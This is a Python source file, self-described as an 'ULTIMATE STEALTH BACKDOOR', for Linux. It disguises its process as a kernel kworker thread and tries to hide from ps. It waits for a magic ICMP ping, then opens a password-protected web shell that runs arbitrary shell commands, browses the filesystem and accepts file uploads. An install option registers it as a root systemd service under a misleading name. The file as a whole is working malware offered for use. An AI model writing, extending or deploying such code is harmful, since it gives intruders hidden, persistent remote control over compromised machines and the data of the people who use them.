#!/usr/bin/env python3
"""
ULTIMATE STEALTH: Rename process BEFORE fork - FIXED LOGIN & FILE BROWSER
"""

import os
import sys
import hashlib
import json
import subprocess
import socket
import struct
import threading
import time
import select
import random
import ctypes
import ctypes.util
import base64
import urllib.parse

# ==================== CONFIGURATION ====================
CONFIG = {
    'password': '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',  # 'password'
    'shell_port': 5430,
    'shell_timeout': 3600,
    'magic_payload': b'OPEN_SHELL_ALPHA_2024',
}

# ==================== LOW-LEVEL PROCESS RENAME ====================
def rename_process_immediately():
    """Rename process IMMEDIATELY using multiple techniques"""

    kworker_names = [
        "kworker/0:0",
        "kworker/0:1H",
        "kworker/u16:0",
        "kworker/1:1-cgroup_destroy",
        "[kworker/0:0]",
        "[kworker/u16:0]",
    ]

    new_name = random.choice(kworker_names)

    # METHOD 1: Setproctitle (best)
    try:
        import setproctitle
        setproctitle.setproctitle(new_name)
        print(f"✅ Process renamed to: {new_name}")
        return True
    except ImportError:
        pass

    # METHOD 2: Direct prctl for Linux
    if sys.platform.startswith('linux'):
        try:
            # Load libc
            libc = ctypes.CDLL(ctypes.util.find_library('c'))

            # Call prctl to set process name
            # PR_SET_NAME = 15
            libc.prctl(15, new_name.encode(), 0, 0, 0)
            print(f"✅ Process renamed via prctl: {new_name}")
            return True
        except:
            pass

    # METHOD 3: argv[0] manipulation
    try:
        sys.argv[0] = new_name
        print(f"✅ argv[0] changed to: {new_name}")
        return True
    except:
        pass

    return False

# ==================== HIDE FROM PS ====================
def hide_from_ps():
    """Techniques to hide from ps command"""

    if not sys.platform.startswith('linux'):
        return False

    try:
        pid = os.getpid()

        # 1. Hide from /proc/pid/stat
        stat_path = f"/proc/{pid}/stat"
        if os.path.exists(stat_path):
            with open(stat_path, 'r') as f:
                stat_data = f.read()

            # Format: pid (comm) state ppid ...
            parts = stat_data.split()
            if len(parts) > 1:
                # Replace command name in parentheses
                kworker_name = random.choice([
                    "kworker/0:0",
                    "kworker/u16:0"
                ])
                parts[1] = f"({kworker_name})"

                # Write back (needs root)
                with open(stat_path, 'w') as f:
                    f.write(' '.join(parts))

        # 2. Hide from /proc/pid/cmdline
        cmdline_path = f"/proc/{pid}/cmdline"
        if os.path.exists(cmdline_path):
            with open(cmdline_path, 'wb') as f:
                f.write(b'\x00')

        # 3. Hide from /proc/pid/comm
        comm_path = f"/proc/{pid}/comm"
        if os.path.exists(comm_path):
            with open(comm_path, 'w') as f:
                f.write("kworker/0:0\n")

        return True

    except Exception as e:
        # Expected if not root
        return False

# ==================== FIXED SHELL HANDLER ====================
class ShellHandler:
    """FIXED: Working login and file browser"""

    def __init__(self):
        self.sessions = {}
        self.session_lock = threading.Lock()

    def handle_request(self, client_socket, client_address):
        """Handle HTTP request - FIXED VERSION"""
        try:
            # Receive request
            request_data = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if not request_data:
                return

            lines = request_data.split('\r\n')
            if len(lines) < 1:
                return

            # Parse request line
            request_line = lines[0]
            parts = request_line.split()
            if len(parts) < 2:
                return

            method = parts[0]
            path = parts[1]

            # Parse headers
            headers = {}
            for line in lines[1:]:
                if ': ' in line:
                    key, value = line.split(': ', 1)
                    headers[key.lower()] = value

            # Get session from cookie
            session_id = None
            if 'cookie' in headers:
                cookies = headers['cookie'].split(';')
                for cookie in cookies:
                    if 'session=' in cookie:
                        session_id = cookie.split('session=')[1].strip()

            # Handle routes
            if path == '/':
                self.serve_login(client_socket, method, headers, request_data)
            elif path == '/login' and method == 'POST':
                self.handle_login_post(client_socket, request_data)
            elif path == '/main':
                if self.check_session(session_id, client_address[0]):
                    self.serve_main(client_socket)
                else:
                    self.redirect_login(client_socket)
            elif path == '/api/command' and method == 'POST':
                if self.check_session(session_id, client_address[0]):
                    self.handle_command(client_socket, request_data)
                else:
                    self.send_json_response(client_socket, {'success': False, 'error': 'Unauthorized'}, 401)
            elif path == '/api/files' and method == 'POST':
                if self.check_session(session_id, client_address[0]):
                    self.handle_list_files(client_socket, request_data)
                else:
                    self.send_json_response(client_socket, {'success': False, 'error': 'Unauthorized'}, 401)
            elif path == '/api/upload' and method == 'POST':
                if self.check_session(session_id, client_address[0]):
                    self.handle_upload(client_socket, request_data)
                else:
                    self.send_json_response(client_socket, {'success': False, 'error': 'Unauthorized'}, 401)
            elif path == '/api/system':
                if self.check_session(session_id, client_address[0]):
                    self.handle_system_info(client_socket)
                else:
                    self.send_json_response(client_socket, {'success': False, 'error': 'Unauthorized'}, 401)
            else:
                self.send_404(client_socket)

        except Exception as e:
            print(f"Request error: {e}")
            try:
                self.send_json_response(client_socket, {'success': False, 'error': 'Server error'}, 500)
            except:
                pass

    def serve_login(self, client_socket, method, headers, request_data):
        """Serve login page"""
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Shell Access</title>
    <style>
        body { font-family: Arial; margin: 50px; background: #f5f5f5; }
        .login-box { background: white; padding: 40px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #333; margin-bottom: 30px; }
        input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        #message { margin-top: 15px; padding: 10px; text-align: center; }
        .error { background: #ffe6e6; color: #d00; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔐 Shell Access</h2>
        <form id="loginForm">
            <input type="password" id="password" placeholder="Enter password" required>
            <button type="submit">Login</button>
        </form>
        <div id="message"></div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            const message = document.getElementById('message');

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password: password})
                });
                const data = await response.json();

                if (data.success) {
                    message.style.color = 'green';
                    message.textContent = 'Login successful! Redirecting...';
                    setTimeout(() => window.location.href = '/main', 1000);
                } else {
                    message.className = 'error';
                    message.textContent = data.error || 'Login failed';
                }
            } catch (error) {
                message.className = 'error';
                message.textContent = 'Network error';
            }
        });
    </script>
</body>
</html>'''

        response = f"HTTP/1.1 200 OK\r\n"
        response += "Content-Type: text/html\r\n"
        response += f"Content-Length: {len(html)}\r\n"
        response += "\r\n"
        response += html

        client_socket.send(response.encode())

    def handle_login_post(self, client_socket, request_data):
        """Handle login POST request"""
        try:
            # Parse JSON body
            body_start = request_data.find('\r\n\r\n') + 4
            body = request_data[body_start:]
            data = json.loads(body)
            password = data.get('password', '')

            # Check password
            if hashlib.sha256(password.encode()).hexdigest() == CONFIG['password']:
                session_id = hashlib.sha256(os.urandom(32)).hexdigest()
                with self.session_lock:
                    self.sessions[session_id] = {
                        'ip': client_socket.getpeername()[0],
                        'time': time.time()
                    }

                response = {'success': True, 'session': session_id}
                headers = f"Set-Cookie: session={session_id}; Path=/\r\n"
            else:
                response = {'success': False, 'error': 'Invalid password'}
                headers = ""

            self.send_json_response(client_socket, response, 200, headers)

        except Exception as e:
            print(f"Login error: {e}")
            self.send_json_response(client_socket, {'success': False, 'error': 'Server error'}, 500)

    def serve_main(self, client_socket):
        """Serve main shell interface"""
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Shell Console</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .tab { overflow: hidden; border: 1px solid #ccc; background: #f1f1f1; border-radius: 5px 5px 0 0; }
        .tab button { background: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; transition: 0.3s; }
        .tab button:hover { background: #ddd; }
        .tab button.active { background: #007bff; color: white; }
        .tabcontent { display: none; padding: 20px; border: 1px solid #ccc; border-top: none; border-radius: 0 0 5px 5px; }
        .command-input { width: 70%; padding: 10px; margin-right: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .execute-btn { padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .output { background: #1e1e1e; color: #00ff00; padding: 15px; margin: 10px 0; border-radius: 5px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto; }
        .file-list { border: 1px solid #ddd; border-radius: 5px; padding: 10px; max-height: 400px; overflow-y: auto; }
        .file-item { padding: 8px; border-bottom: 1px solid #eee; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🐍 Shell Console</h1>

        <div class="tab">
            <button class="tablinks active" onclick="openTab('command')">Command</button>
            <button class="tablinks" onclick="openTab('files')">Files</button>
            <button class="tablinks" onclick="openTab('system')">System</button>
        </div>

        <div id="command" class="tabcontent" style="display: block;">
            <h3>Execute Command</h3>
            <div>
                <input type="text" class="command-input" id="cmdInput" placeholder="Enter command...">
                <button class="execute-btn" onclick="executeCommand()">Execute</button>
            </div>
            <div class="output" id="cmdOutput">Ready...</div>
        </div>

        <div id="files" class="tabcontent">
            <h3>File Manager</h3>
            <div style="margin-bottom: 15px;">
                <input type="text" id="filePath" value="." style="width: 50%; padding: 8px; margin-right: 10px;">
                <button onclick="listFiles()">List Files</button>
            </div>
            <div class="file-list" id="fileList">Click "List Files" to browse</div>

            <h4 style="margin-top: 20px;">Upload File</h4>
            <input type="file" id="fileUpload">
            <button onclick="uploadFile()">Upload</button>
        </div>

        <div id="system" class="tabcontent">
            <h3>System Information</h3>
            <button onclick="getSystemInfo()">Refresh Info</button>
            <div class="output" id="systemInfo">Click "Refresh Info" to load</div>
        </div>
    </div>

    <script>
        // Tab switching
        function openTab(tabName) {
            const tabcontents = document.getElementsByClassName('tabcontent');
            const tablinks = document.getElementsByClassName('tablinks');

            for (let tab of tabcontents) {
                tab.style.display = 'none';
            }
            for (let link of tablinks) {
                link.className = link.className.replace(' active', '');
            }

            document.getElementById(tabName).style.display = 'block';
            event.currentTarget.className += ' active';
        }

        // Command execution
        async function executeCommand() {
            const cmd = document.getElementById('cmdInput').value;
            const output = document.getElementById('cmdOutput');

            if (!cmd.trim()) return;

            output.textContent = 'Executing...';

            try {
                const response = await fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: cmd})
                });
                const data = await response.json();

                if (data.success) {
                    output.textContent = data.output || 'Command executed successfully';
                } else {
                    output.textContent = 'Error: ' + data.error;
                }
            } catch (error) {
                output.textContent = 'Network error: ' + error.message;
            }
        }

        // File operations
        async function listFiles() {
            const path = document.getElementById('filePath').value;
            const fileList = document.getElementById('fileList');

            fileList.innerHTML = 'Loading...';

            try {
                const response = await fetch('/api/files', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({path: path})
                });
                const data = await response.json();

                if (data.success) {
                    let html = '';
                    data.items.forEach(item => {
                        const icon = item.is_dir ? '📁' : '📄';
                        const size = item.is_dir ? '' : ` (${item.size} bytes)`;
                        html += `<div class="file-item">${icon} ${item.name}${size}</div>`;
                    });

                    fileList.innerHTML = html;
                    document.getElementById('filePath').value = data.current_path;
                } else {
                    fileList.innerHTML = 'Error: ' + data.error;
                }
            } catch (error) {
                fileList.innerHTML = 'Network error';
            }
        }

        // File upload
        async function uploadFile() {
            const fileInput = document.getElementById('fileUpload');
            const file = fileInput.files[0];

            if (!file) {
                alert('Please select a file');
                return;
            }

            const reader = new FileReader();
            reader.onload = async function(e) {
                const content = e.target.result.split(',')[1]; // Remove data URL prefix
                const currentPath = document.getElementById('filePath').value;
                const filePath = currentPath + '/' + file.name;

                try {
                    const response = await fetch('/api/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            path: filePath,
                            content: content
                        })
                    });
                    const data = await response.json();

                    if (data.success) {
                        alert('File uploaded successfully');
                        listFiles();
                    } else {
                        alert('Error: ' + data.error);
                    }
                } catch (error) {
                    alert('Network error');
                }
            };
            reader.readAsDataURL(file);
        }

        // System info
        async function getSystemInfo() {
            const infoDiv = document.getElementById('systemInfo');
            infoDiv.textContent = 'Loading...';

            try {
                const response = await fetch('/api/system');
                const data = await response.json();

                if (data.success) {
                    let text = '';
                    for (const [key, value] of Object.entries(data.info)) {
                        text += `${key}: ${value}\n`;
                    }
                    infoDiv.textContent = text;
                } else {
                    infoDiv.textContent = 'Error: ' + data.error;
                }
            } catch (error) {
                infoDiv.textContent = 'Network error';
            }
        }

        // Enter key for command
        document.getElementById('cmdInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') executeCommand();
        });

        // Load initial tab
        openTab('command');
    </script>
</body>
</html>'''

        response = f"HTTP/1.1 200 OK\r\n"
        response += "Content-Type: text/html\r\n"
        response += f"Content-Length: {len(html)}\r\n"
        response += "\r\n"
        response += html

        client_socket.send(response.encode())

    def handle_command(self, client_socket, request_data):
        """Handle command execution"""
        try:
            body_start = request_data.find('\r\n\r\n') + 4
            body = request_data[body_start:]
            data = json.loads(body)
            command = data.get('command', '')

            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )

            output = result.stdout
            if result.stderr:
                output += f"\nError:\n{result.stderr}"

            self.send_json_response(client_socket, {'success': True, 'output': output})

        except subprocess.TimeoutExpired:
            self.send_json_response(client_socket, {'success': False, 'error': 'Command timeout'})
        except Exception as e:
            self.send_json_response(client_socket, {'success': False, 'error': str(e)})

    def handle_list_files(self, client_socket, request_data):
        """Handle file listing"""
        try:
            body_start = request_data.find('\r\n\r\n') + 4
            body = request_data[body_start:]
            data = json.loads(body)
            path = data.get('path', '.')

            if not os.path.exists(path):
                self.send_json_response(client_socket, {'success': False, 'error': 'Path does not exist'})
                return

            items = []
            current_path = os.path.abspath(path)

            for item in os.listdir(current_path):
                item_path = os.path.join(current_path, item)
                try:
                    stat = os.stat(item_path)
                    items.append({
                        'name': item,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat.st_size,
                        'permissions': oct(stat.st_mode)[-3:],
                    })
                except:
                    continue

            self.send_json_response(client_socket, {
                'success': True,
                'items': items,
                'current_path': current_path
            })

        except Exception as e:
            self.send_json_response(client_socket, {'success': False, 'error': str(e)})

    def handle_upload(self, client_socket, request_data):
        """Handle file upload"""
        try:
            body_start = request_data.find('\r\n\r\n') + 4
            body = request_data[body_start:]
            data = json.loads(body)

            path = data.get('path', '')
            content_b64 = data.get('content', '')

            content = base64.b64decode(content_b64)

            directory = os.path.dirname(path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)

            with open(path, 'wb') as f:
                f.write(content)

            self.send_json_response(client_socket, {'success': True, 'message': 'File uploaded'})

        except Exception as e:
            self.send_json_response(client_socket, {'success': False, 'error': str(e)})

    def handle_system_info(self, client_socket):
        """Handle system info"""
        try:
            import platform
            import psutil

            info = {
                'system': platform.system(),
                'hostname': platform.node(),
                'cpu_count': psutil.cpu_count(),
                'cpu_percent': psutil.cpu_percent(),
                'memory_total': psutil.virtual_memory().total,
                'memory_used': psutil.virtual_memory().used,
                'memory_percent': psutil.virtual_memory().percent,
                'current_user': os.getenv('USER') or os.getenv('USERNAME'),
                'current_dir': os.getcwd()
            }

            self.send_json_response(client_socket, {'success': True, 'info': info})

        except Exception as e:
            self.send_json_response(client_socket, {'success': False, 'error': str(e)})

    def check_session(self, session_id, client_ip):
        """Check if session is valid"""
        if not session_id:
            return False

        with self.session_lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                # Check IP match and timeout (30 minutes)
                if (session['ip'] == client_ip and
                    time.time() - session['time'] < 1800):
                    session['time'] = time.time()
                    return True
                else:
                    # Remove expired session
                    del self.sessions[session_id]

        return False

    def redirect_login(self, client_socket):
        """Redirect to login page"""
        response = "HTTP/1.1 302 Found\r\n"
        response += "Location: /\r\n"
        response += "\r\n"
        client_socket.send(response.encode())

    def send_json_response(self, client_socket, data, status_code=200, extra_headers=""):
        """Send JSON response"""
        json_data = json.dumps(data)
        response = f"HTTP/1.1 {status_code} OK\r\n"
        response += "Content-Type: application/json\r\n"
        if extra_headers:
            response += extra_headers
        response += f"Content-Length: {len(json_data)}\r\n"
        response += "\r\n"
        response += json_data
        client_socket.send(response.encode())

    def send_404(self, client_socket):
        """Send 404 response"""
        response = "HTTP/1.1 404 Not Found\r\n"
        response += "Content-Type: text/plain\r\n"
        response += "Content-Length: 13\r\n"
        response += "\r\n"
        response += "404 Not Found"
        client_socket.send(response.encode())

# ==================== DAEMONIZE WITH STEALTH ====================
def stealth_daemonize():
    """Daemonize dengan stealth features"""

    print("🎭 Starting stealth daemon...")

    # STEP 1: Rename process IMMEDIATELY
    rename_process_immediately()

    # STEP 2: Hide from ps (if root)
    if os.geteuid() == 0:
        hide_from_ps()

    # STEP 3: Fork to background
    try:
        # First fork
        pid = os.fork()
        if pid > 0:
            # Parent exits
            os._exit(0)

        # Create new session
        os.setsid()

        # Second fork
        pid = os.fork()
        if pid > 0:
            os._exit(0)

        # Change directory
        os.chdir('/')

        # Close file descriptors
        for fd in range(3, 1024):
            try:
                os.close(fd)
            except:
                pass

        # Redirect stdio to /dev/null
        devnull = os.open('/dev/null', os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)
        os.close(devnull)

        # Set umask
        os.umask(0)

        return True

    except Exception as e:
        print(f"❌ Daemonize failed: {e}")
        return False

# ==================== ICMP SERVER (SIMPLIFIED) ====================
class StealthServer:
    def __init__(self):
        self.running = True
        self.shell_handler = ShellHandler()

        # Check root
        if os.geteuid() != 0:
            print("❌ Must run as root!")
            sys.exit(1)

    def run(self):
        """Main server loop"""
        try:
            # Create ICMP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setblocking(0)

            print(f"✅ ICMP server listening...")
            print(f"💡 Shell port: {CONFIG['shell_port']}")
            print(f"🔑 Password: password")

            while self.running:
                try:
                    # Check for packets
                    ready, _, _ = select.select([sock], [], [], 1.0)

                    if ready:
                        packet, addr = sock.recvfrom(2048)

                        # Check magic payload
                        if len(packet) > 28 and packet[20] == 8:  # ICMP Echo Request
                            payload = packet[28:]
                            if CONFIG['magic_payload'] in payload:
                                client_ip = addr[0]
                                print(f"✅ Trigger from {client_ip}")

                                # Start shell
                                self.start_shell()

                except KeyboardInterrupt:
                    break
                except:
                    pass

            sock.close()

        except Exception as e:
            print(f"❌ Error: {e}")

    def start_shell(self):
        """Start shell server"""
        # Fork untuk shell
        pid = os.fork()
        if pid > 0:
            return  # Parent continues

        # Child runs shell
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', CONFIG['shell_port']))
            sock.listen(5)

            print(f"🚀 Shell started on port {CONFIG['shell_port']}")
            print(f"🌐 Access: http://<server_ip>:{CONFIG['shell_port']}")
            print(f"⏰ Will auto-close in {CONFIG['shell_timeout']//60} minutes")

            # Accept connections for timeout period
            start = time.time()
            while time.time() - start < CONFIG['shell_timeout']:
                try:
                    client, addr = sock.accept()
                    client.settimeout(30)

                    # Handle request in thread
                    threading.Thread(
                        target=self.shell_handler.handle_request,
                        args=(client, addr),
                        daemon=True
                    ).start()

                except socket.timeout:
                    continue
                except:
                    break

            sock.close()
            print("🔒 Shell closed")

        except Exception as e:
            print(f"❌ Shell error: {e}")
        finally:
            os._exit(0)

# ==================== MAIN LAUNCHER ====================
def main():
    """Main entry point dengan options jelas"""

    if len(sys.argv) > 1 and sys.argv[1] == '--install':
        # Install as system service
        print("Installing as system service...")

        # Create service file
        service_content = f"""[Unit]
Description=System Kernel Worker
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""

        # Write to systemd
        try:
            with open('/etc/systemd/system/kworker.service', 'w') as f:
                f.write(service_content)

            print("Service file created.")
            print("Enable with: systemctl enable kworker.service")
            print("Start with: systemctl start kworker.service")

        except Exception as e:
            print(f"Install failed: {e}")
            print("Try manual: sudo python3 {sys.argv[0]} --daemon")

        return

    if len(sys.argv) > 1 and sys.argv[1] == '--daemon':
        # Run as daemon
        if stealth_daemonize():
            server = StealthServer()
            server.run()
        return

    if len(sys.argv) > 1 and sys.argv[1] == '--foreground':
        # Run in foreground (debug)
        print("=== STEALTH SERVER (FOREGROUND MODE) ===")
        print("Process will be renamed to kworker")
        print("Press Ctrl+C to stop")
        print("="*40)

        rename_process_immediately()
        server = StealthServer()
        server.run()
        return

    # Default: show help
    print("""
🎭 ULTIMATE STEALTH BACKDOOR
============================

Usage:
  sudo python3 {sys.argv[0]} --daemon      # Run as hidden daemon (RECOMMENDED)
  sudo python3 {sys.argv[0]} --foreground  # Run in foreground (debug)
  sudo python3 {sys.argv[0]} --install     # Install as system service
  sudo python3 {sys.argv[0]} --help        # Show this help

Features:
  • Process renamed to kworker IMMEDIATELY
  • Hidden from ps command (root only)
  • No ports before ICMP trigger
  • Shell on port 5430 after trigger
  • Auto-daemonize to background

Examples:
  sudo python3 {sys.argv[0]} --daemon
  sudo python3 client.py --ping 127.0.0.1
  curl http://127.0.0.1:5430

Notes:
  • REQUIRES ROOT privileges
  • Install setproctitle for best stealth: pip install setproctitle
  • Install psutil for system info: pip install psutil
    """)

if __name__ == '__main__':
    main()
